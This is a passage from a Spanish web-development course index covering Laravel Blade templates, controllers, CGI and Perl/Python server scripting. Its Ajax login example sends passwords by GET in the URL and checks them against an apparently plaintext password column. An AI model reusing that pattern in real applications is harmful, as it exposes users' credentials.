usar de este modo: . @extends('layouts.master') @section('title', 'Page Title') @section('sidebar') &lt;p&gt;Esto se añadirá al sidebar del master layout.&lt;/p&gt; @endsection @section('content') &lt;h2&gt;{{$name}}&lt;/h2&gt; &lt;p&gt;Este es el contenido de mi página.&lt;/p&gt; @endsection . Observa que hemos respetado el master layout de ejemplo que creamos más arriba. Observa también cómo se hace el echo de la variable: nada de abrir y cerrar PHP (&lt;?php ... ?&gt;) ni de abrir y cerrar comillas: simplemente, se encierra la variable entre llaves dobles ({{$variable}}), y Laravel se encargará de traducir eso al echo correspondiente. La vista queda de ese modo mucho más limpia y, por lo tanto, es más fácil de escribir, leer y depurar. 5.8.5. Condiciones en las vistas . Blade admite expresiones condicionales para modificar el aspecto de una vista dependiendo del valor de una variable o del estado de la aplicación. Por supuesto, eso también puede hacerse sin Blade: solo hay que usar un if de PHP. Pero con Blade es más fácil y limpio porque, nuevamente, no tendremos que andar abriendo y cerrando PHP ni peleándonos con las comillas del echo. En el siguiente ejemplo, el contenido de la vista depende de la variable $day enviada desde el controlador. Observa como el if de PHP se sustituye por la directiva @if de Blade. Controlador: . function show() { return view('page', array('name' =&gt; 'Manolo','day' =&gt; 'Viernes')); } . Vista /resources/views/page.blade.php: . @extends('layouts.master') @section('title', 'Page Title') @section('sidebar') &lt;p&gt;Esto se añadirá al sidebar del master layout.&lt;/p&gt; @endsection @section('content') &lt;h2&gt;{{$name}}&lt;/h2&gt; &lt;p&gt;Este es el contenido de mi página.&lt;/p&gt; @if ($day == 'Viernes') &lt;p&gt;Hoy me roban el carro&lt;/p&gt; @else &lt;p&gt;Hoy me dedico a cantar&lt;/p&gt; @endif @endsection . 5.8.6. Bucles en las vistas . Igual que existen condiciones, Blade también permite hacer bucles para simplificar la generación de visas. Por ejemplo, en la siguiente vista recorremos un array llamado $bebidas y mostramos su contenido. Controlador: . function show() { $bebidas = array('Cerveza','Agua','Zumo'); return view('page',array('name' =&gt; 'Manolo','day' =&gt; 'Lunes', 'bebidas' =&gt; $bebidas)); } . Vista /resources/views/page.blade.php: . @extends('layouts.master') @section('title', 'Page Title') @section('sidebar') &lt;p&gt;Esto se añadirá al sidebar del master layout.&lt;/p&gt; @endsection @section('content') &lt;h2&gt;{{$name}}&lt;/h2&gt; &lt;p&gt;Este es el contenido de mi página.&lt;/p&gt; @if ($day == 'Viernes') &lt;p&gt;Hoy me roban el carro&lt;/p&gt; @else &lt;p&gt;Hoy me dedico a cantar&lt;/p&gt; @endif &lt;h2&gt;Estas son las bebidas disponibles:&lt;/h2&gt; @foreach ($bebidas as $bebida) {{$bebida}} &lt;br&gt; @endforeach @endsection . Observa que, nuevamente, esto mismo podría hacerse con PHP clásico, pero con Blade el código queda mucho más limpio y resulta menos propenso a errores. 5.8.7. Invocación de funciones PHP . Desde una vista Blade se puede invocar cualquier función de PHP sin necesidad de abrirlo y cerrarlo (ya sabes: nada de &lt;?php ... ?&gt; en las vistas). Por ejemplo, si necesitamos usar la función date(), la invocamos así: . &lt;h2&gt;Ejemplo de llamada a función estándar de PHP&lt;/h2&gt; &lt;p&gt;La fecha del servidor es: {{date(' D M, Y')}}&lt;/p&gt; . Esto no solo es más limpio, sino también más seguro, porque Blade filtra posibles ataques por XSS. (Por cierto: si alguna vez necesitas saltarte la protección contra XSS, puedes usar {!! … !!} en lugar de {{ … }}). 5.8.8. Otras directivas Blade . Blade dispone de multitud de directivas para hacer prácticamente cualquier cosa en la vista sin tener que recurrir a PHP. En esta lista mostramos solo las directivas más habituales. | @section → Marca el inicio de una sección de contenido. | @endsection → Marca el final de una sección. | @show → Marca el final de una sección y la muestra. | @yield(‘section’) → Muestra el contenido de una sección (si existe, claro). | @extends(‘view’) → Hereda de una plantilla padre. | @parent → Muestra el contenido de la sección del mismo nombre en la plantilla padre. | @include(‘view’) → Incluye una subvista. | @if - @else - @endif → Condicional. | @for - @endfor → Bucle for clásico. | @foreach - @endforeach → Buche foreach. | @forelse - @empty - @endforelse → Como foreach, pero con tratamiento de arrays que vienen vacíos. | @break - @continue → Para usar en los bucles. | @switch - @case - @break → Condicional múltiple. | @isset($variable) - @endisset → Comprueba si la variable existe. | @auth - @endauth → La sección solo se muestra si hay un usuario autenticado en la aplicación. | @php - @endphp → Para añadir código PHP plano. Usar con moderación. | {{- Comment -}} → Comentarios (no serán renderizados). | {{ $variable }} → Equivalente a echo $variable, pero no es necesario abrir y cerrar PHP, y nos protegemos contra inyección de JS. | {{ $variable ?? texto-por-defecto }} → Como el anterior, pero chequea si la variable existe. Si existe, muestra su valor. Si no, muestra texto-por-defecto. | $loop → Es una variable muy útil para usar en y/o depurar un foreach. Nos dice si estamos en el primer elemento, en el último, cuántos loops llevamos, etc. | . 5.8.9. Tratamiento de formularios con Blade . Blade también facilita un montón el tratamiento de los formularios. Y, por supuesto, filtra por nosotros cualquier código malicioso que traten de colarnos a través de ellos. Vamos a verlo con un ejemplo. Imaginemos una vista con este formulario (fíjate cómo indicamos la ruta en el action): . &lt;form method=\"POST\" action=\"{{ route('mi-ruta') }}\"&gt; @csrf &lt;!-- Para evitar ataques CSRF --&gt; &lt;input type=\"email\" name=\"email\"&gt;&lt;br&gt; &lt;input type=\"text\" name=\"asunto\"&gt;&lt;br&gt; &lt;textarea name=\"contenido\"&gt;&lt;/textarea&gt;&lt;br&gt; &lt;button type=\"submit\"&gt;Enviar&lt;/button&gt; &lt;/form&gt; . Recuerda que los métodos PUT, PATCH y DELETE no existen aún en HTML y que Laravel los simula con un campo oculto en el formulario que se crea con la directiva @method(‘PUT’) (o PATCH o DELETE). En este formulario no la hemos usado porque se envía por POST. Lo que sí hemos usado es la directiva @csrf. Todos los formularios deberían llevarla. Impide los ataques por CSRF, incrustado un token aleatorio en el formulario que Laravel se encargará de comprobar cuando los datos del formulario regresen al servidor. No te preocupes si no entiendes bien como funciona, por Laravel se encarga de hacerlo todo. Tú solo tienes que colocar la directiva @csrf en todos tus formularios. En el enrutador, definiremos la ruta “mi-ruta” del action del formulario: . Route::post('mi-ruta', 'MiControlador@store'); . Y, en el controlador, creamos el método store(). Observa cómo recuperamos los datos del formulario a través de la variable $r: . public function store(Request $r) { $email = $r-&gt;get(\"email\"); $asunto = $r-&gt;get(\"asunto\"); ...etc... } . Esta es una forma alternativa para el controlador: . public function store() { $email = request(\"email\"); $asunto = request(\"asunto\"); ...etc... } . 5.8.10. Validación de formularios con Blade . Otra cosa que Blade facilita muchísimo es la validación de formularios en el lado del servidor. Aquí toca hacer un paréntesis para responder a esta pregunta: ¿dónde deberían validarse los formularios? ¿En el cliente (con HTML y Javascript) o en el servidor (con PHP y Laravel)? . La respuesta es: en los dos sitios. Sobre todo si es un formulario con información sensible. La validación en el cliente es más sencilla de hacer. Comprobar que un campo de texto de un formulario no se envía vacío, por ejemplo, es algo trivial con HTML. Y con Javascript es solo un poquito más complicado. Hacer esas comprobaciones en el servidor resulta más trabajoso: hay que recibir el formulario, comprobar los valores de los campos y, si hay un error, tenemos que volver a enviar el formulario, pero respetando los datos que el usuario ya hubiera tecleado, todo ello junto con un mensaje informando del error. Sí, en el servidor es más complicado. Pero también más seguro. Las validaciones en el cliente pueden desactivarse (puedo usar un navegador antiguo para evitar las comprobaciones por HTML, y puedo deshabilitar temporalmente el motor de Javascript), así que son una primera barrera defensiva muy convieniente pero poco segura. Las comprobaciones en el servidor son imposibles de saltar para un atacante. Así que deberíamos hacer los dos conjuntos de comprobaciones en todos nuestros formularios. Y aquí es donde Laravel nos ayuda. Vamos a retomar la vista del ejemplo anterior y a modificar el formulario para que se valide en el servidor. Tendríamos que añadirle algunas cositas: . &lt;form method=\"POST\" action=\"{{ route('mi-ruta') }}\"&gt; @if ($errors-&gt;any()) @foreach ($errors-&gt;all() as $error) {{ $error }}&lt;br&gt; @endforeach @endif &lt;input type=\"email\" name=\"email\"&gt;&lt;br&gt; ...resto del formulario igual... &lt;/form&gt; . Fíjate en cómo mostramos los errores -si los hay- con un bucle. El objeto $errors (disponible en todas las vistas) tiene muchos más métodos útiles que puedes consultar en la documentación de Laravel. Y el controlador quedaría así. Observa cómo definimos varias reglas de validación para campos del formulario: . public function store() { request-&gt;validate([ 'email' =&gt; 'required|email', 'asunto' =&gt; 'required' ]); // A partir de aquí, se procesa el formulario igual que antes . Puedes consultar todas las reglas de validación admitidas en https://laravel.com/docs/validation. Cuando vuelve a cargarse el formulario que contenía un error, suele ser apropiado hacerlo con los datos que el usuario ya había tecleado. A esto se le llama “repopular” el formulario, y con Blade se hace así (observa el atributo value del campo email): . &lt;form method=\"POST\" action=\"{{ route('mi-ruta') }}\"&gt; @if ($errors-&gt;any()) @foreach ($errors-&gt;all() as $error) {{ $error }}&lt;br&gt; @endforeach @endif &lt;input type=\"email\" name=\"email\" value=\"{{ old('email') }}\"&gt;&lt;br&gt; ...resto del formulario igual... &lt;/form&gt; . 5.8.11. Añadir CSS y Javascript a nuestras vistas . Laravel ya trae dos archivos (app.css y app.js) basados en Boostrap para empezar a trabajar. Para usarlos, basta con añadir esto a la cabecera de nuestras vistas: . &lt;link rel=\"stylesheet\" href=\"/css/app.css\"&gt; &lt;script src=\"js/app.js\" defer&gt;&lt;/script&gt; . Si queremos añadir reglas CSS, NO debemos editar /public/app.css, porque es un CSS compilado y minimizado con SASS. Lo correcto para añadir nuestro CSS a ese archivo es: . | Editar /resources/sass/app.css | Recompilar este archivo con SASS (o con less o con stylus) | . La recompilación se hace con este comando . $ npm run dev . O también con: . $ yarn dev . Si no tienes ni idea de lo que estamos hablando con esto de less, SASS y demás zarandajas, tienes dos opciones: o te empapas un poco de ello antes de continuar (lamentablemente, en este manual no tenemos espacio para verlo TODO), o te olvidas de ellos y colocas tu CSS y tu Javascript en un directorio púbico sin compilar ni nada. Para lograr esto último, simplemente, guarda tu CSS y tu Javascript en el directorio /public de Laravel. En ese caso, los archivos no estarían optimizados (tendríamos que optimizarlos a mano, si queremos) y serían accesibles de forma pública. Pero es una solución lo suficientemente buena para empezar. Un consejo: si vas a colocar tu CSS y tu Javascript en /public, al menos crea subcarpetas para organizarlo un poco. Por ejemplo, /public/css y /public/js. 5.8.12. Vistas de error personalizadas . Por último, te menciono un pequeño truco para darle a tu aplicación un toque más profesional: personalizar las vistas de error. Simplemente, crea una carpeta /resources/views/errors. Todas las vistas que metas ahí dentro se considerarán pantallas de error. Ahora solo tienes que ponerles los nombres adecuados. Por ejemplo, si creas un archivo llamado /resources/views/errors/404.blade.php, esa vista se mostrará cada vez que ocurra un error 404 (página no encontrada). Fácil, ¿no? . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/vistas-y-plantillas-con-blade.html#58-vistas-y-plantillas-blade",
    "relUrl": "/laravel/vistas-y-plantillas-con-blade.html#58-vistas-y-plantillas-blade"
  },"92": {
    "doc": "5.8 Vistas y plantillas. Blade",
    "title": "5.8 Vistas y plantillas. Blade",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/vistas-y-plantillas-con-blade.html",
    "relUrl": "/laravel/vistas-y-plantillas-con-blade.html"
  },"93": {
    "doc": "5.9 Controladores",
    "title": "5.9. Controladores",
    "content": ". | 5.9.1. Cuatro cosas importantes sobre los controladores en Laravel | 5.9.2. Tres formas de crear un controlador | . Los controladores son un elemento clave de la arquitectura MVC. En Laravel, los controladores funcionan exactamente igual que en las aplicaciones MVC hechas con PHP clásico. Es decir: son los puntos de entrada a la aplicación desde el enrutador. Los controladores deberían permanecer lo más sencillos posible: nada de accesos a la base de datos ni de generación de HTML. Esas acciones se derivarán a los modelos y las vistas. El controlador es un organizador del flujo de la aplicación: decide qué componente tiene que trabajar y el orden en el que lo debe hacer. En esta sección, vamos a aprender a construir controladores con Laravel. Vas a ver que es algo extremadamente sencillo. 5.9.1. Cuatro cosas importantes sobre los controladores en Laravel . | Los controladores en Laravel siempre heredan de la clase Controller o de una subclase de Controller. class MiControlador extends Controller { ... } . | Su nombre debería escribirse en singular, CamelCase y terminando en la palabra Controller. Por ejemplo: UserController, LoginController, ArticleController… . | Cada método del controlador debe terminar en un return. Lo que el método devuelva será convertido automáticamente en una HTTP response 200, es decir, en una respuesta válida http, excepto si es un array, en cuyo caso Laravel lo convertirá automáticamente en JSON (perfecto para responder a peticiones Ajax, como veremos más adelante). | Si lo necesitas, puedes actuar sobre la HTTP response devolviendo algo como esto: . return response('contenido', 201) -&gt;header('mi-cabecera', 'contenido') -&gt;header('otra-cabecera', 'más-contenido') -&gt;cookie('mi-cookie', 'valor'); (etc) . (Pero no nos engañemos: no lo necesitarás hacer demasiado a menudo). | . 5.9.2. Tres formas de crear un controlador . Los controladores se pueden crear a mano: vas al directorio /app/http/controllers, creas allí un archivo vacío y empiezas a escribir código como una fiera. Pero nadie lo hace así porque Artisan ya crea el esqueleto del archivo por ti. Así que es mejor que vayas a lo práctico: abre una consola en tu servidor web y ponte a escribir. Forma 1. Crear un controlador vacío. Por ejemplo, para crear un controlador para la tabla de usuarios: . $ php artisan make:controller UserController . Forma 2. Crear un controlador de tipo resource. Estos controladores se generan automáticamente con un andamiaje para construir recursos REST. Es decir, la clase ya llevará incorporados los métodos index(), create(), store(), show(), edit(), update() y destroy() del estándar REST. (Si no sabes de qué estamos hablando, revisa la sección que dedicamos al enrutamiento en Laravel) . Para crear un controlador RESTful: . $ php artisan make:controller UserController --resource . No te olvides de añadir al enrutador (/routes/web.php) las rutas REST para este tipo controlador. Te recuerdo que se pueden resumir las siete rutas en esta sola entrada del enrutador: . Route::resource('nombreRecurso', 'controlador'); . En nuestro ejemplo: . Route::resource('usuarios', 'UserController'); . Forma 3. Crear un controlador tipo API. Una API (Application Programming Interface) es un interfaz entre programas. Es decir, es la forma en la que unos programas interaccionan con otros. Algunas aplicaciones web se diseñan para que otros programas las utilicen, no para que las utilicen seres humanos. En estos casos, el interfaz de usuario no existe (o es mínimo) y lo importante es el API. Y los métodos del controlador no devuelven vistas, sino datos formateados en JSON. Se puede construir con Laravel un controlador tipo API de forma muy simple, porque es parecido a un resource, pero sin create() ni edit(), porque una API no necesita mostrar los formularios de inserción/modificación. $ php artisan make:controller UserController --api . De nuevo, no te olvides de las entradas en el enrutador. Puedes englobarlas todas en una sola entrada con este aspecto: . Route::apiResource('usuarios', 'UserController'); . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/controladores.html#59-controladores",
    "relUrl": "/laravel/controladores.html#59-controladores"
  },"94": {
    "doc": "5.9 Controladores",
    "title": "5.9 Controladores",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/controladores.html",
    "relUrl": "/laravel/controladores.html"
  },"95": {
    "doc": "8.1 CGI",
    "title": "8.1. Common Gateway Interface (CGI)",
    "content": "CGI es la solución más antigua para el desarrollo web en el lado del servidor. En la década de 1990, cuando se empezó a pensar en la posibilidad de crear página dinámicas generadas por el servidor a partir de los recursos del mismo (típicamente, una base de datos), los primeros desarrollos utilizaron, como es lógico, las tecnologías presentes en ese momento en los servidores web. Todos los servidores tenían un compilador de C/C++, así que alguien pensó: ¿por qué no escribimos las aplicaciones web en C/C++, las compilamos y hacemos que el ejecutable se pueda invocar vía web? . Para lograr esto último, se utilizó CGI (Common Gateway Interface). CGI es una interfaz entre los servidores web y las aplicaciones que se ejecutan en el servidor. Estas aplicaciones pueden estar construidas en cualquier lenguaje (no solo C/C++). A CGI, eso le da igual. Solo define la forma de transferir información en ambos sentidos. La figura siguiente muestra la forma en la que se ejecutan programas en el servidor a través de CGI. Si lo observas con atención, verás que no difiere demasiado de la forma en la que trabaja PHP, porque cualquier petición tiene 4 pasos: . | Se recibe la petición de un cliente web. | El servidor web recibe la peticion y, a través del interfaz CGI, le pide al sistema operativo que ejecute el programa correspondiente. | La salida del programa se redirige al servidor web. De esto se encarga, nuevamente, el interfaz CGI. | El servidor devuelve al cliente el resultado de la ejecución del programa. | . 8.1.1. Entonces, ¿en qué se diferencia CGI de PHP? . Lo primero, CGI no es un lenguaje de programación. Eso ya lo hemos dicho. Es un interfaz entre el servidor web y el sistema operativo para poder ejecutar cualquier programa escrito en cualquier lenguaje a través de la web. Puede parecer una solución perfecta, ¿verdad? Pero, si fuera así, ¿por qué no se sigue usando de forma masiva? ¿Por qué se abandonó en favor de PHP u otros de los lenguajes que vamos a ver más adelante? . La respuesta breve es: CGI tiene problemas de rendimiento. Cada vez que se recibe una petición de un cliente, se crea un nuevo proceso en el servidor para ejecutar el programa en cuestión. Este proceso necesita un espacio de memoria para colocar su código fuente y sus datos, y estos recursos solo se liberan cuando el servidor termina de responder al cliente. Esta creación de procesos independientes implica una carga importante para el servidor, por lo cual esta modalidad de generación de contenido dinámico no es escalable. Por su parte, PHP (y otras soluciones que veremos más adelante) no crean un proceso independiente para cada petición recibida, sino que un mismo macro-proceso se encarga de gestionarlas todas. En términos de escalabilidad, esta opción es mucho mejor. Así que, cuando los servidores empezaron a recibir muchas visitas simultáneas, CGI comenzó a abandonarse. Sencillamente, ningún servidor CGI podía soportar grandes volúmenes de peticiones. Existen algunas alternativas para solucionar este problema de CGI, como mantener un sólo proceso CGI en memoria que se encargue de procesar todas las peticiones (técnica conocida como FastCGI y que, de hecho, se sigue utilizando en la actualidad, incluso para ejecutar PHP en el servidor), pero resulta más complejo de configurar y operar, e implica algunos problemas de seguridad. En cualquier caso, estos detalles de configuración del servidor son cosas que competen más a los administradores de sistemas que a los desarrolladores. ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/cgi.html#81-common-gateway-interface-cgi",
    "relUrl": "/otros/cgi.html#81-common-gateway-interface-cgi"
  },"96": {
    "doc": "8.1 CGI",
    "title": "8.1 CGI",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/cgi.html",
    "relUrl": "/otros/cgi.html"
  },"97": {
    "doc": "8.2 Perl",
    "title": "8.2. Perl",
    "content": "A partir de este punto, veremos varios lenguajes alternativos a PHP (es decir, su “competencia”) siguiendo siempre el mismo esquema: . | Primero, enumeraremos las características y filosofia del lenguaje. | Luego explicaremos a grandes rasgos cómo hay que configurar el servidor para poder usar ese lenguaje para desarrollo web. | Después mostraremos la sintaxis básica del lenguaje. | Por último, escribiremos dos ejemplos completos en cada lenguaje: un sencillo “hola, mundo” y un programa algo más complejo que lanza una validación de login mediante ajax. En este segundo caso, la parte del cliente será siempre la misma, y solo cambiaremos la parte del servidor. Eso te permitirá apreciar las diferencias entre unos lenguajes y otros. Enseguida te darás cuenta de que esas diferencias son mínimas. | . 8.2.1. Características del lenguaje Perl . Fecha de aparición: 1987. Perspectivas: . | Uso decreciente. | Apto para tareas pequeñas y rápidas. | Cuenta con desarrolladores muy fieles y experimentados. Documentación muy extensa. | Soporte amplio en cualquier servidor. | . Filosofía de Perl: . | Versión mejorada del shell scripting de Unix. | Pensado para procesamiento rápido de archivos de texto y automatización de tareas de administración del sistema. | Favorece la programación ágil, rápida y sucia de scripts. | Énfasis en las expresiones regulares. | Multiparadigma. | En combinación con CGI, se popularizó para aplicaciones web antes de la aparición de PHP. | . 8.2.2. Configuración necesaria en el servidor . Para utilizar Perl en un servidor Apache o similar, necesitaremos: . | Instalar el intérprete Perl (usr/bin/perl). | Activar los módulos perl y/o cgi de Apache y configurar el handler para CGI. | Instalar módulos Perl adicionales para acceso a bases de datos, etc. | . Se puede ejecutar el intérprete Perl de forma nativa en Apache, o bien hacerlo a través de CGI. Lo primero es más difícil de configurar y raramente se encuentra en hostings web compartidos. 8.2.3. Sintaxis básica de Perl . Las variables en Perl no se declaran, tienen tipado dinámico y son globales por defecto. $var = valor; print \"La variable var vale $variable\"; . Algunos operadores: . | Comparación: lt, gt, le, ge, eq, ne… | Asignación: = | . Algunas estructuras de control: . while (condicion) { Acciones } if (condicion) { Acciones-1 } else { Acciones-2 } . 8.2.4. Entrada / salida . Entrada de datos estándar: . chop ( $variable = &lt;STDIN&gt; ); . Lectura de datos desde un formulario HTML: . use CGI; my $cgi = CGI-&gt;new; my $username = $cgi-&gt;param(\"username\"); . Salida: . print \"cadena $variable cadena...\"; . 8.2.5. Bibliotecas, funciones y clases . Para utilizar una biblioteca o package, como se denominan en Perl, se emplea la palabra use: . use nombre-biblioteca; . Las bibliotecas se empaquetan en archivos con extensión .pm (Perl Modules). Dentro de ellas, puede haber una colección de funciones o métodos que se declaran así: . package nombre-biblioteca; Sub nombre-funcion (argumentos) { Acciones } . Estas funciones pueden usarse desde fuera de la biblioteca con esta sintaxis: . use nombre-biblioteca; nombre-biblioteca::nombre-funcion(argumentos); . Los packages también pueden usarse para construir clases (o algo parecido) de las que luego se pueden instanciar objetos. Más o menos así: . package nombre-de-la-clase; sub new { # Este es el método constructor my $self = {}; # Array para los atributos $self-&gt;{VAR1} = 0; # Un atributo $self-&gt;{VAR2} = 9; # Otro atributo } sub otro-método{ # Aquí van el resto de métodos de la clase } sub DESTROY { # Método destructor } 1 # Para que el intérprete Perl no se queje al interpretar este archivo . Como puedes observar, Perl está lleno de peculiaridades que muchos consideran anticuadas o, como mínimo, poco elegantes. Observa si no la forma que tiene de crear los atributos de instancia, los caprichosos nombres de los métodos (a veces en minúscula, a veces en mayúscula) o la necesidad de terminar el package con un 1 para que el intérprete Perl lo considere un script válido. Por último, para instanciar un objeto de esta clase: . use nombre-de-la-clase; $objeto = nombre-de-la-clase-&gt;new(); . 8.2.6. Ejemplo 1 en Perl: Hola mundo . #!/usr/bin/perl print \"Content-type: text/html\\n\\n\"; print \"&lt;html&gt;&lt;title&gt;Hola mundo&lt;/title&gt;&lt;body&gt;\"; print \"Hola, mundo\"; print \"&lt;/body&gt;&lt;/html&gt;\"; . 8.2.7. Ejemplo 2 en Perl: login con comprobación de email por Ajax . Este segundo ejemplo, como hemos explicado más arriba, consistirá en un formulario de login que comprobará el nombre de usuario y la contraseña mediante una petición Ajax. Formulario HTML . El formulario de login es un simple código HTML que será idéntico en todos los ejemplos que veremos en el resto de este capítulo, así que solo lo mostraremos aquí por primera vez. &lt;form id=\"loginForm\" name=\"loginForm\" method=\"post\" action=\"\"&gt; &lt;fieldset&gt; &lt;p&gt; &lt;label for=\"username\"&gt;Nombre de usuario&lt;/label&gt; &lt;br /&gt; &lt;input type=\"text\" id=\"username\" name=\"username\" class=\"text\" size=\"20\" /&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=\"password\"&gt;Contraseña&lt;/label&gt; &lt;br /&gt; &lt;input type=\"password\" id=\"password\" name=\"password\" class=\"text\" size=\"20\" /&gt; &lt;/p&gt; &lt;p&gt; &lt;button type=\"submit\"&gt;Login&lt;/button&gt; &lt;/p&gt; &lt;/fieldset&gt; &lt;/form&gt; . Script jQuery . El script que lanza la petición Ajax (cuyo código puede ir en el mismo archivo que el formulario) será casi idéntico en todos los ejemplos: solo cambiará el nombre del script al que se lanza la petición. En nuestro caso actual, es script lo hemos llamado login.pl (la extensión .pl denota que se trata de un script escrito en lenguaje Perl). Como es lógico, en ejemplos posteriores, tendrías que cambiar el nombre de ese archivo por el que corresponda (login.py si estamos usando Python, login.rb si estamos usando Ruby, etc). Para no repetirnos innecesariamente, no volveremos a mostrar tampoco el código de este script en los ejemplos sucesivos. Observa que Javascript está esperando que el servidor responda con un JSON que puede llevar estos tres datos en su interior: . | data.error: Un string con un texto de error en caso de que el usuario o la contraseña sean incorrectos. | data.success: Un string con un texto de éxito en caso de que el usuario y la contraseña sean correctos. | data.userId: Un entero con el ID del usuario logueado (solo en caso de éxito). | . $(document).ready(function(){ $(\"form#loginForm\").submit(function() { var username = $('#username').attr('value'); // Obtenemos el username var password = $('#password').attr('value'); // Obtenemos la password if (username &amp;&amp; password) { // Los valores de username y password no están vacíos $.ajax({ type: \"GET\", url: \"login.pl\", dataType: \"json\", data: \"username=\" + username + \"&amp;password=\" + password, success: function(data){ if (data.error) { // El servidor ha devuelto un error de login $('div#loginResult').text(\"data.error: \" + data.error); $('div#loginResult').addClass(\"error\"); } else { // El servidor ha hecho el login correctamente $('form#loginForm').hide(); $('div#loginResult').text(\"data.success: \" + data.success + \", data.userid: \" + data.userid); $('div#loginResult').addClass(\"success\"); } } }); } else { $('div#loginResult').text(\"Debe escribir su nombre de usuario y su contraseña\"); $('div#loginResult').addClass(\"error\"); } $('div#loginResult').fadeIn(); return false; }); }); . Script Perl en el lado del servidor (login.pl) . Este sería el script en Perl que respondería a la petición Ajax anterior. Observa que, a pesar de la peculiar sintaxis de Perl, la estructura del algoritmo es idéntica a la que usaríamos si lo escribiéramos en PHP: . | Recuperamos los datos del formulario (username y password) | Conectamos con la base de datos | Lanzamos la consulta contra la tabla de usuarios | En función del resultado de la consulta, preparamos nuestro JSON de respuesta al cliente | Devolvemos el JSON al cliente | . #!/usr/bin/perl -T use CGI; use DBI; use strict; use warnings; # read the CGI params my $cgi = CGI-&gt;new; my $username = $cgi-&gt;param(\"username\"); my $password = $cgi-&gt;param(\"password\"); # connect to the database my $dbh = DBI-&gt;connect(\"DBI:mysql:database=mydb;host=localhost;port=2009\", \"mydbusername\", \"mydbpassword\") or die $DBI::errstr; # check the username and password in the database my $statement = qq{SELECT id FROM users WHERE username=? and password=?}; my $sth = $dbh-&gt;prepare($statement) or die $dbh-&gt;errstr; $sth-&gt;execute($username, $password) or die $sth-&gt;errstr; my ($userID) = $sth-&gt;fetchrow_array; # create a JSON string according to the database result my $json = ($userID) ? qq{{\"success\" : \"login is successful\", \"userid\" : \"$userID\"}} : qq{{\"error\" : \"username or password is wrong\"}}; # return JSON string print $cgi-&gt;header(-type =&gt; \"application/json\", -charset =&gt; \"utf-8\"); print $json; . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/perl.html#82-perl",
    "relUrl": "/otros/perl.html#82-perl"
  },"98": {
    "doc": "8.2 Perl",
    "title": "8.2 Perl",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/perl.html",
    "relUrl": "/otros/perl.html"
  },"99": {
    "doc": "8.3 Python",
    "title": "8.3. Python",
    "content": "8.3.1. Características del lenguaje Python . Fecha de aparición: 1991 . Perspectivas: . | Uso creciente. | Es el sustituto natural de Perl para el desarrollo rápido de scripts. | También usado en grandes proyectos como alternativa a PHP. | Menos extendido que PHP, pero comunidad con muchos desarrolladores profesionales (mejor relación señal/ruido) | Muchas bibliotecas de terceros → flexibilidad | . Filosofía: . | Es la versión “limpia” de Perl. Pensado para escribir scripts de forma rápida y limpia. | Énfasis en la legibilidad: Python es casi pseudocódigo (código “pythonico” → v. “El Zen de Python”) | Interpretado. Tipado dinámico. Fuertemente tipado. | Expresiones regulares heredadas de Perl. | Multiparadigma: imperativo, O.O., funcional. | . 8.3.2. Configuración necesaria en el servidor . Para hacer funcionar Python en un servidor Apache o similar, es necesario: . | Instalar el intérprete Python (/usr/bin/python). El más extendido es CPhyton. | Activar los módulos python y/o cgi de Apache y configurar el handler de Apache para CGI. | Instalar módulos adicionales (p. ej: para acceso a bases de datos) si es necesario. | . Python puede funcionar de forma nativa integrado en Apache o a través de CGI. Lo primero es más rápido; lo segundo, más frecuente. 8.3.3. Sintaxis básica de Python . Las variables en Python no se declaran obligatoriamente: tienen tipado dinámico y son locales por defecto. varariable = valor; print \"La variable var vale %s\" (variable); . En Python hay muchos tipos de datos complejos predefinidos: listas, tuplas, diccionarios… . Algunos operadores son: . | Comparación: &lt;, &gt;, &lt;=, &gt;=, ==, != | Asignación: = | . Y estas son algunas estructuras de control. ¡Cuidado! ¡El código debe indentarse OBLIGATORIAMENTE! No existen las llaves ({ y }) en Python. ¡La indentación (o sangrado) marca los bloques! . while condicion: Acciones if condicion: Acciones-1 else: Acciones-2 . 8.3.4. Entrada / Salida . La entrada de datos por teclado puede hacerse con raw_input(): . variable = raw_input(\"Texto\") . Pero a nosotros nos interesa hacer entrada de datos a través de un formulario HTML. Esto se hace así: . import cgi form = cgi.FieldStorage() campo = form[\"campo\"].value . En cuanto a la salida de datos, se usa print con cadenas de formato, seguida de una lista de variables. Cada elemento de la cadena de formato marcado con un % se sustituirá por una variable de la lista, en el mismo orden en el que estén escritas. Por ejemplo: . print \"cadena %s cadena %s ...\" (variable1, variable2) . El símbolo %s significa que en esa posición irá un String. Otras posibilidades son %d (enteros) o %f (float). Esta forma de especificar las cadenas de formato está directamente tomada del lenguaje C. En Python existen muchas otras formas de hacer una salida de datos, pero print es lo suficientemente potente como para que puedas utilizarla para cualquier cosa imaginable en una aplicación web. 8.3.5. Bibliotecas, funciones y clases . En Python hay tres niveles de agrupación de bibliotecas: . | Módulos: un módulo es un fichero con código Python en su interior. Puede ser una clase o un puñado de funciones sueltas, por ejemplo. | Paquetes (packages): un paquete es un directorio que contiene varios módulos. También puede contener subpaquetes. Los paquetes se instalan y desinstalan con un gestor de paquetes (como pip, que viene a ser como composer en PHP). | Bibliotecas (libraries): una biblioteca es cualquier fragmento de código reutilizable que se puede incluir en otros proyectos. Las bibliotecas pueden ser paquetes o no. Existe una Python Standard Library que contiene todas las funciones básicas de Python y viene preinstalada con el core del lenguaje. | . Podemos incluir una librería en nuestro proyecto Python usando la palabra import: . import mi-librería . Como hemos dicho, dentro de cada módulo puede haber clases o subrutinas sueltas. Una subrutina (procedimiento o función) se declara así en Python (observa de nuevo como la indentación o sangrado es fundamental porque marca el comienzo y final de los bloques de código): . def mi-funcion(param1, param2, etc): # Aquí va el código de la función [return valor1, varlor2...] . En cuanto a las clases, la sintaxis para declararlas y muy similar a PHP, Java o C++ (recordando que, en Python, no se usan las llaves sino la indentación): . class MyClass: un_atributo = valor otro_atributo = valor # Esto es un constructor def __init__(self): self.un_atributo = 0 def un_metodo(parámetros): return lo_que_sea . 8.3.6. Ejemplo 1 en Python: Hola mundo . #!/usr/bin/python print \"Content-type: text/html\\n\\n\" print \"&lt;html&gt;&lt;body&gt;\" print \"&lt;h1&gt;Hola, 